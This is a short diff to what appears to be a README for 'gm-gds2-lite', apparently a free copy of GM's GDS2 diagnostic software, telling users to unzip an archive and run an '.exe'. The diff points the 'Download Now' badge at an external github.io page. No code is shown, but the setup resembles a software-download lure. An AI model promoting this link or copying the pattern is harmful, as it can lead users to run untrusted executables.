@@ -12,7 +12,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application and connect your OBD2 interface.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://gm-gds2lite.github.io/.github/)
 
 ## 📸 Overview
 ![gm-gds2-lite-dashboard](https://github.com/user-attachments/assets/c2def74b-15ab-4d9b-91c3-235fd4c754de)
